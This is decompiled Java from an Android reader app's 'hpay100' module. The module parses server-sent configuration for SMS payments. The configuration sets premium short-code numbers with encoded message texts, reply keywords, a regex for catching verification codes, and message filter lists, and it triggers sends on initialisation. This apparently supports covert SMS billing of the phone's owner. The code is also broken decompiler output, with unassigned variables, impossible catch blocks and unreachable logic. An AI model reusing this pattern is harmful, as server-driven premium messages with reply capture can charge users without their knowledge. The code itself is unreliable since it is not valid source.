package com.clilystudio.netbook.hpay100.config;

import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;

import com.clilystudio.netbook.hpay100.z;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Random;
import java.util.UUID;

public class a {

    public static SharedPreferences b;
    public int a;

    public static HPaySMS a(String String1) {
        HPaySMS HPaySMS2;
        JSONObject JSONObject13;

        if (TextUtils.isEmpty((CharSequence) String1))
            return null;
        else {
            JSONObject JSONObject3;
            Object Object10;
            boolean boolean11;

            try {
                try {
                    Object Object6;
                    Object Object7;

                    HPaySMS2 = new HPaySMS();
                    JSONObject3 = new JSONObject(String1);
                    Object6 = JSONObject3.optString("spnumber", "");
                    Object7 = JSONObject3.optString("sms_msg", "");
                    if (!android.text.TextUtils.isEmpty((CharSequence) Object6) && !android.text.TextUtils.isEmpty((CharSequence) Object7)) {
                        String String20 = new String(com.clilystudio.netbook.hpay100.c.d.a((String) Object7), "utf-8").toString();

                        HPaySMS2.mSMSAddress = ((String) Object6).split("@@@");
                        HPaySMS2.mSMSContent = String20.split("@@@");
                    }
                } catch (Exception Exception4) {
                    Exception4.printStackTrace();
                    return null;
                }
                try {
                    HPaySMS2.mCodeType = JSONObject3.optInt("isMonthly", 0);
                } catch (Exception Exception8) {
                    try {
                        Exception8.printStackTrace();
                    } catch (JSONException JSONException5) {
                        JSONException5.printStackTrace();
                        return null;
                    } catch (Exception Exception21) {
                        Exception21.printStackTrace();
                        return null;
                    }
                }
                try {
                    Object Object9;

                    HPaySMS2.mChID = JSONObject3.optString("ch_id", "");
                    HPaySMS2.mChType = JSONObject3.optString("ch_type", "");
                    HPaySMS2.mAmount = JSONObject3.optInt("amount", 0);
                    HPaySMS2.mRealAmount = JSONObject3.optInt("real_amount", 0);
                    HPaySMS2.mScheme = JSONObject3.optInt("scheme", 3);
                    HPaySMS2.mOrderidHR = JSONObject3.optString("orderid", "");
                    HPaySMS2.mReplyAdderss = JSONObject3.optString("sms_reply_num", "");
                    HPaySMS2.mReplyContent = JSONObject3.optString("sms_reply_content", "");
                    HPaySMS2.mDetail = JSONObject3.optString("detail", "");
                    HPaySMS2.mIntervalTimes = JSONObject3.optInt("sms_interval", 3);
                    com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("hPaySMS.mIntervalTimes:").append(HPaySMS2.mIntervalTimes).toString());
                    if (HPaySMS2.mIntervalTimes > 30)
                        HPaySMS2.mIntervalTimes = 3;
                    Object9 = JSONObject3.optString("sms_reply_keyword", "");
                    if (!android.text.TextUtils.isEmpty((CharSequence) Object9))
                        HPaySMS2.mReplyKeyword = ((String) Object9).split(",");
                    HPaySMS2.mSdkFeeType = JSONObject3.optInt("sdk_fee_type", 0);
                    HPaySMS2.mPhone = JSONObject3.optString("phone", "");
                    HPaySMS2.mCorpFeeCode = JSONObject3.optString("corp_fee_code", "");
                    HPaySMS2.mFeeUrl = JSONObject3.optString("fee_url", "");
                    HPaySMS2.mOpenUrl = JSONObject3.optString("open_url", "");
                    HPaySMS2.mIsFullScreen = JSONObject3.optInt("isfullscreen", 0);
                    Object10 = JSONObject3.optString("yzm_regx", "");
                    boolean11 = TextUtils.isEmpty((CharSequence) Object10);
                } catch (Exception Exception22) {
                    Exception22.printStackTrace();
                    return null;
                }
            } catch (JSONException JSONException23) {
                JSONException23.printStackTrace();
                return null;
            }
            if (!boolean11) {
                try {
                    try {
                        HPaySMS2.mYzmRegx = new String(com.clilystudio.netbook.hpay100.c.d.a((String) Object10), "utf-8").toString();
                    } catch (Exception Exception19) {
                        try {
                            Exception19.printStackTrace();
                        } catch (JSONException JSONException24) {
                            JSONException24.printStackTrace();
                            return null;
                        } catch (Exception Exception25) {
                            Exception25.printStackTrace();
                            return null;
                        }
                    }
                    try {
                        JSONObject13 = JSONObject3.optJSONObject("js_url_map");
                    } catch (Exception Exception12) {
                        try {
                            Exception12.printStackTrace();
                        } catch (JSONException JSONException26) {
                            JSONException26.printStackTrace();
                            return null;
                        } catch (Exception Exception27) {
                            Exception27.printStackTrace();
                            return null;
                        }
                    }
                    return HPaySMS2;
                } catch (JSONException JSONException28) {
                    JSONException28.printStackTrace();
                    return null;
                }
                ;
            }
        }
        if (JSONObject13 != null) {
            try {
                Iterator Iterator14;

                HPaySMS2.mJsUrlHashMap = new HashMap();
                Iterator14 = JSONObject13.keys();
            } catch (JSONException JSONException29) {
                JSONException29.printStackTrace();
                return null;
            } catch (Exception Exception30) {
                Exception30.printStackTrace();
            }
        }
        return HPaySMS2;
    }

    public static z a(int int1, String String2, int int3, String String4, String String5, int int6, String String7) {
        z z8 = new z();

        z8.d(int1);
        z8.e(int1);
        z8.c(String2);
        z8.e = int3;
        z8.c = String4;
        z8.d = String5;
        z8.a(2);
        z8.b(int6);
        z8.a(String7);
        return z8;
    }

    public static z a(HPaySMS HPaySMS1) {
        z z2 = new z();

        z2.a(1);
        z2.a = HPaySMS1.mChID;
        z2.b = HPaySMS1.mChType;
        z2.b(HPaySMS1.mOrderidHR);
        z2.c(HPaySMS1.mOrderidAPP);
        z2.c(HPaySMS1.mScheme);
        z2.c = HPaySMS1.mPayName;
        z2.d(HPaySMS1.mAmount);
        z2.e(HPaySMS1.mRealAmount);
        z2.d = HPaySMS1.mPayId;
        z2.e = HPaySMS1.mCodeType;
        z2.a(true);
        return z2;
    }

    public static z a(HPaySMS HPaySMS1, int int2, String String3) {
        z z4 = new z();

        z4.a(2);
        z4.a = HPaySMS1.mChID;
        z4.b = HPaySMS1.mChType;
        z4.b(HPaySMS1.mOrderidHR);
        z4.c(HPaySMS1.mOrderidAPP);
        z4.c(HPaySMS1.mScheme);
        z4.d = HPaySMS1.mPayId;
        z4.c = HPaySMS1.mPayName;
        z4.d(HPaySMS1.mAmount);
        z4.e(HPaySMS1.mRealAmount);
        z4.e = HPaySMS1.mCodeType;
        if (int2 == 6104 || int2 == 104 || int2 == 129)
            z4.a(true);
        else
            z4.a(false);
        z4.b(int2);
        z4.a(String3);
        return z4;
    }

    public static String a(int int1) {
        switch (int1) {
            default:
                return new StringBuilder(String.valueOf(int1 / 100)).append("\u5143").toString();
            case 10:
                return "0.1\u5143";
            case 20:
                return "0.2\u5143";
            case 50:
                return "0.5\u5143";
        }
    }

    static String a(HashMap HashMap1) {
        StringBuilder StringBuilder2 = new StringBuilder();

        StringBuilder2.append(new StringBuilder("&sid=").append((String) HashMap1.get("sid")).toString());
        StringBuilder2.append(new StringBuilder("&action=").append((String) HashMap1.get("action")).toString());
        StringBuilder2.append(new StringBuilder("&orderid=").append((String) HashMap1.get("orderid")).toString());
        StringBuilder2.append(new StringBuilder("&aoid=").append((String) HashMap1.get("aoid")).toString());
        StringBuilder2.append(new StringBuilder("&pid=").append((String) HashMap1.get("pid")).toString());
        StringBuilder2.append(new StringBuilder("&scheme=").append((String) HashMap1.get("scheme")).toString());
        StringBuilder2.append(new StringBuilder("&price=").append((String) HashMap1.get("amount")).toString());
        StringBuilder2.append(new StringBuilder("&amount=").append((String) HashMap1.get("amount")).toString());
        StringBuilder2.append(new StringBuilder("&chtype=").append((String) HashMap1.get("chtype")).toString());
        StringBuilder2.append(new StringBuilder("&chid=").append((String) HashMap1.get("chid")).toString());
        StringBuilder2.append(new StringBuilder("&status=").append((String) HashMap1.get("status")).toString());
        StringBuilder2.append(new StringBuilder("&errorcode=").append((String) HashMap1.get("errorcode")).toString());
        StringBuilder2.append(new StringBuilder("&page=").append((String) HashMap1.get("page")).toString());
        return StringBuilder2.toString();
    }

    public static ArrayList a() {
        ArrayList ArrayList3;

        label_116:
        {
            if (TextUtils.isEmpty((CharSequence) l.f))
                return null;
            else {
                try {
                    JSONArray JSONArray1 = new JSONArray(l.f);

                    if (JSONArray1.length() <= 0)
                        break label_116;
                    ArrayList3 = new ArrayList();
                } catch (JSONException JSONException5) {
                    JSONException JSONException6;

                    ArrayList3 = null;
                    JSONException6 = JSONException5;
                    JSONException6.printStackTrace();
                } catch (Exception Exception2) {
                    Exception Exception4;

                    ArrayList3 = null;
                    Exception4 = Exception2;
                    Exception4.printStackTrace();
                }
                return ArrayList3;
            }
        }
        ArrayList3 = null;
    }

    public static void a(Context Context1, String String2) {
        JSONObject JSONObject5;
        JSONArray JSONArray11;
        JSONArray JSONArray12;
        Object Object13;
        Object Object18;
        Object Object19;
        boolean boolean20;

        label_81:
        {
            String[] String_1darray32;

            label_73:
            {
                if (!android.text.TextUtils.isEmpty((CharSequence) String2)) {
                    label_246:
                    {
                        try {
                            Object Object6;
                            String String7;
                            String String8;
                            String String35;

                            if (b == null)
                                b = Context1.getSharedPreferences("hpay_game_config", 0);
                            JSONObject5 = new JSONObject(String2);
                            l.g = JSONObject5.optInt("is_filter", 0);
                            l.h = JSONObject5.optInt("is_confirm", 0);
                            Object6 = JSONObject5.optString("white", "");
                            String7 = JSONObject5.optString("msisdn", "");
                            l.i = JSONObject5.optLong("next_interval_sec", 86400L);
                            String8 = com.clilystudio.netbook.hpay100.c.b.b(String7);
                            if (!com.clilystudio.netbook.hpay100.c.b.a(String8))
                                break label_246;
                            l.j = String8;
                            String35 = l.f(Context1.getApplicationContext());
                            b.edit().putString(String35, l.j).commit();
                            l.a(Context1, (k) new y(Context1));
                            if (TextUtils.isEmpty((CharSequence) Object6))
                                break label_81;
                            String_1darray32 = ((String) Object6).split("@@@");
                            break label_73;
                        } catch (JSONException JSONException4) {
                            JSONException4.printStackTrace();
                            return;
                        } catch (Exception Exception3) {
                            Exception3.printStackTrace();
                            return;
                        }
                    }
                    try {
                        String String9 = l.f(Context1.getApplicationContext());

                        b.edit().putString(String9, "").commit();
                    } catch (JSONException JSONException36) {
                        JSONException36.printStackTrace();
                        return;
                    } catch (Exception Exception37) {
                        Exception37.printStackTrace();
                        return;
                    }
                }
                return;
            }
            if (String_1darray32 != null) {
                int int33;
                int int34;

                try {
                    int33 = String_1darray32.length;
                } catch (JSONException JSONException38) {
                    JSONException38.printStackTrace();
                    return;
                } catch (Exception Exception39) {
                    Exception39.printStackTrace();
                    return;
                }
                for (int34 = 0; int34 < int33; ++int34) {
                    try {
                        l.b(Context1, String_1darray32[int34]);
                    } catch (JSONException JSONException40) {
                        JSONException40.printStackTrace();
                        return;
                    } catch (Exception Exception41) {
                        Exception41.printStackTrace();
                        return;
                    }
                }
            }
        }
        try {
            l.f = "";
            JSONArray11 = JSONObject5.optJSONArray("filters");
        } catch (JSONException JSONException42) {
            JSONException42.printStackTrace();
            return;
        } catch (Exception Exception43) {
            Exception43.printStackTrace();
            return;
        }
        if (JSONArray11 != null && JSONArray11.length() > 0)
            l.f = JSONArray11.toString();
        JSONArray12 = JSONObject5.optJSONArray("fee_code_scheme");
        if (JSONArray12 != null && JSONArray12.length() > 0 && !android.text.TextUtils.isEmpty((CharSequence) JSONArray12.toString()))
            l.p = JSONArray12.toString();
        Object13 = JSONObject5.optString("reserveurl", "");
        if (!android.text.TextUtils.isEmpty((CharSequence) Object13)) {
            String[] String_1darray29 = ((String) Object13).split("@@@");

            if (String_1darray29 != null) {
                int int30;
                int int31;

                try {
                    int30 = String_1darray29.length;
                } catch (JSONException JSONException44) {
                    JSONException44.printStackTrace();
                    return;
                } catch (Exception Exception45) {
                    Exception45.printStackTrace();
                    return;
                }
                for (int31 = 0; int31 < int30; ++int31) {
                    try {
                        l.a(Context1, String_1darray29[int31]);
                    } catch (JSONException JSONException46) {
                        JSONException46.printStackTrace();
                        return;
                    } catch (Exception Exception47) {
                        Exception47.printStackTrace();
                        return;
                    }
                }
            }
        }
        try {
            b.edit().putInt("hpay_game_filter", l.g).commit();
            b.edit().putInt("hpay_game_confirm", l.h).commit();
            b.edit().putString("hpay_game_filter_content", l.f).commit();
            if (!android.text.TextUtils.isEmpty((CharSequence) l.p))
                b.edit().putString("hpay_game_scheme_content", l.p).commit();
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("HPAY_NEXT_INITTIME 2:").append(l.i).toString());
            b.edit().putLong("hpay_game_next_inittime", l.i).commit();
            Object18 = JSONObject5.optString("init_spnumber", "");
            Object19 = JSONObject5.optString("init_msg", "");
            if (TextUtils.isEmpty((CharSequence) Object18))
                return;
            boolean20 = TextUtils.isEmpty((CharSequence) Object19);
        } catch (JSONException JSONException48) {
            JSONException48.printStackTrace();
            return;
        } catch (Exception Exception49) {
            Exception49.printStackTrace();
            return;
        }
        if (!boolean20) {
            String[] String_1darray23;
            String[] String_1darray24;

            try {
                String String22 = new String(com.clilystudio.netbook.hpay100.c.d.a((String) Object19), "utf-8").toString();

                String_1darray23 = ((String) Object18).split("@@@");
                String_1darray24 = String22.split("@@@");
            } catch (JSONException JSONException50) {
                JSONException50.printStackTrace();
                return;
            } catch (Exception Exception21) {
                try {
                    Exception21.printStackTrace();
                } catch (JSONException JSONException51) {
                    JSONException51.printStackTrace();
                    return;
                } catch (Exception Exception52) {
                    Exception52.printStackTrace();
                    return;
                }
                return;
            }
            if (String_1darray23 != null && String_1darray24 != null && String_1darray23.length > 0 && String_1darray24.length > 0) {
                int int25 = String_1darray23.length;
                int int26 = String_1darray24.length;
                int int27 = 0;

                if (int25 == int26) {
                    for (; ; ) {
                        try {
                            if (int27 >= String_1darray23.length)
                                break;
                            com.clilystudio.netbook.hpay100.c.b.a(String_1darray23[int27], String_1darray24[int27]);
                        } catch (JSONException JSONException53) {
                            JSONException53.printStackTrace();
                            return;
                        } catch (Exception Exception54) {
                            Exception54.printStackTrace();
                            return;
                        }
                        ++int27;
                    }
                }
            }
        }
    }

    public static void a(Context Context1, String String2, int int3, String String4, int int5, String String6, String String7, int int8) {
        try {
            HashMap HashMap9 = new HashMap();

            HashMap9.put("action", "3");
            HashMap9.put("sid", l.l);
            HashMap9.put("aoid", String2);
            HashMap9.put("orderid", "");
            HashMap9.put("pid", String4);
            HashMap9.put("scheme", new StringBuilder(String.valueOf(int3)).toString());
            HashMap9.put("amount", new StringBuilder(String.valueOf(int5)).toString());
            HashMap9.put("chtype", "");
            HashMap9.put("chid", "");
            HashMap9.put("status", String6);
            HashMap9.put("errorcode", String7);
            HashMap9.put("page", new StringBuilder(String.valueOf(int8)).toString());
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("statc3 data:").append(HashMap9.toString()).toString());
            a(Context1, HashMap9);
        } catch (Exception Exception10) {
            Exception10.printStackTrace();
            return;
        }
    }

    public static void a(Context Context1, String String2, String String3, int int4) {
        HashMap HashMap5;
        int int19;
        int int20;

        try {
            HashMap5 = new HashMap();
            HashMap5.put("action", "1");
            HashMap5.put("sid", l.l);
            HashMap5.put("aoid", "");
            HashMap5.put("orderid", "");
            HashMap5.put("pid", "");
            HashMap5.put("scheme", "");
            HashMap5.put("amount", "");
            HashMap5.put("chtype", "");
            HashMap5.put("chid", "");
            HashMap5.put("status", String2);
            HashMap5.put("errorcode", String3);
            HashMap5.put("page", new StringBuilder("0").toString());
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("statc1 data:").append(HashMap5.toString()).toString());
            int19 = com.clilystudio.netbook.hpay100.c.j.a();
            int20 = l.d(Context1);
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("currentDay:").append(int19).toString());
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("initSdkDay:").append(int20).toString());
        } catch (Exception Exception6) {
            Exception6.printStackTrace();
            return;
        }
        if (int19 != int20) {
            try {
                com.clilystudio.netbook.hpay100.a.a.b("dalongTest", "statc1 upload");
                a(Context1, HashMap5);
                l.b(Context1, int19);
            } catch (Exception Exception21) {
                Exception21.printStackTrace();
                return;
            }
        }
    }

    public static void a(Context Context1, String String2, String String3, int int4, int int5, String String6, String String7, int int8) {
        try {
            HashMap HashMap9 = new HashMap();

            HashMap9.put("action", "2");
            HashMap9.put("sid", l.l);
            HashMap9.put("aoid", String2);
            HashMap9.put("orderid", "");
            HashMap9.put("pid", String3);
            HashMap9.put("scheme", new StringBuilder(String.valueOf(int5)).toString());
            HashMap9.put("amount", new StringBuilder(String.valueOf(int4)).toString());
            HashMap9.put("chtype", "");
            HashMap9.put("chid", "");
            HashMap9.put("status", String6);
            HashMap9.put("errorcode", String7);
            HashMap9.put("page", new StringBuilder("0").toString());
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("statc2 data:").append(HashMap9.toString()).toString());
            a(Context1, HashMap9);
        } catch (Exception Exception10) {
            Exception10.printStackTrace();
            return;
        }
    }

    public static void a(Context Context1, String String2, String String3, int int4, String String5, String String6, String String7, int int8, String String9, String String10, int int11) {
        try {
            HashMap HashMap12 = new HashMap();

            HashMap12.put("action", "4");
            HashMap12.put("sid", l.l);
            HashMap12.put("aoid", String2);
            HashMap12.put("orderid", String3);
            HashMap12.put("pid", String5);
            HashMap12.put("scheme", new StringBuilder(String.valueOf(int4)).toString());
            HashMap12.put("amount", new StringBuilder(String.valueOf(int8)).toString());
            HashMap12.put("chtype", String6);
            HashMap12.put("chid", String7);
            HashMap12.put("status", String9);
            HashMap12.put("errorcode", String10);
            HashMap12.put("page", new StringBuilder(String.valueOf(int11)).toString());
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("statc4 data:").append(HashMap12.toString()).toString());
            a(Context1, HashMap12);
        } catch (Exception Exception13) {
            Exception13.printStackTrace();
            return;
        }
    }

    public static void a(Context Context1, String String2, String String3, String String4, String String5, int int6, String String7, int int8, String String9, String String10, int int11) {
        try {
            HashMap HashMap12 = new HashMap();

            HashMap12.put("action", "7");
            HashMap12.put("sid", l.l);
            HashMap12.put("orderid", String3);
            HashMap12.put("aoid", String2);
            HashMap12.put("pid", String7);
            HashMap12.put("scheme", new StringBuilder(String.valueOf(int6)).toString());
            HashMap12.put("amount", new StringBuilder(String.valueOf(int8)).toString());
            HashMap12.put("chtype", String4);
            HashMap12.put("chid", String5);
            HashMap12.put("status", String9);
            HashMap12.put("errorcode", String10);
            HashMap12.put("page", new StringBuilder(String.valueOf(int11)).toString());
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("statc7 data:").append(HashMap12.toString()).toString());
            a(Context1, HashMap12);
        } catch (Exception Exception13) {
            Exception13.printStackTrace();
            return;
        }
    }

    private static void a(Context Context1, HashMap HashMap2) {
        if (com.clilystudio.netbook.hpay100.a.a.j(Context1.getApplicationContext())) {
            Thread Thread3 = new Thread((Runnable) new h(Context1, HashMap2));

            Thread3.setName("thread_sms_dot");
            Thread3.start();
        }
    }

    public static g b(Context Context1, String String2) {
        if (TextUtils.isEmpty((CharSequence) String2))
            return null;
        else {
            g g3;
            JSONObject JSONObject4;

            label_58:
            {
                String[] String_1darray22;

                try {
                    Object Object9;

                    g3 = new g();
                    JSONObject4 = new JSONObject(String2);
                    JSONObject4.optString("payid", "");
                    l.h = JSONObject4.optInt("is_confirm", 0);
                    if (b == null)
                        b = Context1.getSharedPreferences("hpay_game_config", 0);
                    b.edit().putInt("hpay_game_confirm", l.h).commit();
                    Object9 = JSONObject4.optString("reserveurl", "");
                    if (TextUtils.isEmpty((CharSequence) Object9))
                        break label_58;
                    String_1darray22 = ((String) Object9).split("@@@");
                } catch (JSONException JSONException6) {
                    JSONException6.printStackTrace();
                    return null;
                } catch (Exception Exception5) {
                    Exception5.printStackTrace();
                    return null;
                }
                if (String_1darray22 != null) {
                    int int23;
                    int int24;

                    try {
                        int23 = String_1darray22.length;
                    } catch (JSONException JSONException25) {
                        JSONException25.printStackTrace();
                        return null;
                    } catch (Exception Exception26) {
                        Exception26.printStackTrace();
                        return null;
                    }
                    for (int24 = 0; int24 < int23; ++int24) {
                        try {
                            l.a(Context1, String_1darray22[int24]);
                        } catch (JSONException JSONException27) {
                            JSONException27.printStackTrace();
                            return null;
                        } catch (Exception Exception28) {
                            Exception28.printStackTrace();
                            return null;
                        }
                    }
                }
            }
            label_119:
            {
                Object Object10;
                Object Object11;
                boolean boolean13;

                try {
                    Object10 = JSONObject4.optString("sms_number", "");
                    Object11 = JSONObject4.optString("sms_content", "");
                    if (TextUtils.isEmpty((CharSequence) Object10))
                        break label_119;
                    boolean13 = TextUtils.isEmpty((CharSequence) Object11);
                } catch (JSONException JSONException29) {
                    JSONException29.printStackTrace();
                    return null;
                } catch (Exception Exception30) {
                    Exception30.printStackTrace();
                    return null;
                }
                if (!boolean13) {
                    try {
                        String String15 = new String(com.clilystudio.netbook.hpay100.c.d.a((String) Object11), "utf-8").toString();
                        String[] String_1darray16 = ((String) Object10).split("@@@");
                        String[] String_1darray17 = String15.split("@@@");
                    } catch (JSONException JSONException31) {
                        JSONException31.printStackTrace();
                        return null;
                    } catch (Exception Exception14) {
                        try {
                            Exception14.printStackTrace();
                        } catch (JSONException JSONException32) {
                            JSONException32.printStackTrace();
                            return null;
                        } catch (Exception Exception33) {
                            Exception33.printStackTrace();
                            return null;
                        }
                    }
                }
            }
            try {
                String String12;

                g3.a = JSONObject4.optInt("scheme", 3);
                String12 = com.clilystudio.netbook.hpay100.c.b.b(JSONObject4.optString("phone", ""));
                if (com.clilystudio.netbook.hpay100.c.b.a(String12))
                    l.j = String12;
            } catch (JSONException JSONException34) {
                JSONException34.printStackTrace();
                return null;
            } catch (Exception Exception35) {
                Exception35.printStackTrace();
                return null;
            }
            return g3;
        }
    }

    public static i b(String String1) {
        if (TextUtils.isEmpty((CharSequence) String1))
            return null;
        else {
            i i3;

            try {
                JSONObject JSONObject2 = new JSONObject(String1);

                i3 = new i();
                i3.a = JSONObject2.optInt("status", -1);
                i3.b = JSONObject2.optString("msg", "");
                if (i3.a == 0)
                    i3.c = JSONObject2.optString("res", "");
            } catch (Exception Exception4) {
                Exception4.printStackTrace();
                i3 = null;
            }
            return i3;
        }
    }

    public static String b() {
        Object Object1 = l.k;
        Object Object3;
        String String4;
        long long5;
        char[] char_1darray7;
        int int8;
        StringBuffer StringBuffer9;
        Random Random10;
        String String12;

        try {
            if (TextUtils.isEmpty((CharSequence) Object1))
                Object1 = UUID.randomUUID().toString().replaceAll("-", "");
            String4 = ((String) Object1).substring(8, 24);
            long5 = System.currentTimeMillis() / 1000L;
            char_1darray7 = new char[]{
                    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e',
                    'f', 'A', 'B', 'C', 'D', 'E', 'F'
            };
        } catch (Exception Exception2) {
            Object3 = Object1;
            Exception2.printStackTrace();
            return (String) Object3;
        }
        int8 = 0;
        try {
            StringBuffer9 = new StringBuffer("");
            Random10 = new Random();
        } catch (Exception Exception14) {
            Object3 = Object1;
            Exception14.printStackTrace();
            return (String) Object3;
        }
        while (int8 < 6) {
            int int13;

            try {
                int13 = Math.abs(Random10.nextInt(22));
            } catch (Exception Exception15) {
                Object3 = Object1;
                Exception15.printStackTrace();
                return (String) Object3;
            }
            if (int13 < 0 || int13 >= 22)
                continue;
            try {
                StringBuffer9.append(char_1darray7[int13]);
            } catch (Exception Exception16) {
                Object3 = Object1;
                Exception16.printStackTrace();
                return (String) Object3;
            }
            ++int8;
        }
        try {
            String String11 = StringBuffer9.toString();

            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("currenttime:").append(long5).toString());
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("tmpUUID:").append(String4).toString());
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("random:").append(String11).toString());
            String12 = new StringBuilder(String.valueOf(String4)).append(long5).append(String11).toString();
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("orderid:").append(String12).toString());
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("length:").append(String12.length()).toString());
        } catch (Exception Exception17) {
            Object3 = Object1;
            Exception17.printStackTrace();
            return (String) Object3;
        }
        return String12;
    }

    public static void b(Context Context1, String String2, String String3, int int4, String String5, String String6, String String7, int int8, String String9, String String10, int int11) {
        try {
            HashMap HashMap12 = new HashMap();

            HashMap12.put("action", "5");
            HashMap12.put("sid", l.l);
            HashMap12.put("orderid", String3);
            HashMap12.put("aoid", String2);
            HashMap12.put("pid", String5);
            HashMap12.put("scheme", new StringBuilder(String.valueOf(int4)).toString());
            HashMap12.put("amount", new StringBuilder(String.valueOf(int8)).toString());
            HashMap12.put("chtype", String6);
            HashMap12.put("chid", String7);
            HashMap12.put("status", String9);
            HashMap12.put("errorcode", String10);
            HashMap12.put("page", new StringBuilder(String.valueOf(int11)).toString());
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("statc5 data:").append(HashMap12.toString()).toString());
            a(Context1, HashMap12);
        } catch (Exception Exception13) {
            Exception13.printStackTrace();
            return;
        }
    }

    public static void c(Context Context1, String String2, String String3, int int4, String String5, String String6, String String7, int int8, String String9, String String10, int int11) {
        try {
            HashMap HashMap12 = new HashMap();

            HashMap12.put("action", "6");
            HashMap12.put("sid", l.l);
            HashMap12.put("orderid", String3);
            HashMap12.put("aoid", String2);
            HashMap12.put("pid", String5);
            HashMap12.put("scheme", new StringBuilder(String.valueOf(int4)).toString());
            HashMap12.put("amount", new StringBuilder(String.valueOf(int8)).toString());
            HashMap12.put("chtype", String6);
            HashMap12.put("chid", String7);
            HashMap12.put("status", String9);
            HashMap12.put("errorcode", String10);
            HashMap12.put("page", new StringBuilder(String.valueOf(int11)).toString());
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("statc6 data:").append(HashMap12.toString()).toString());
            a(Context1, HashMap12);
        } catch (Exception Exception13) {
            Exception13.printStackTrace();
            return;
        }
    }
}
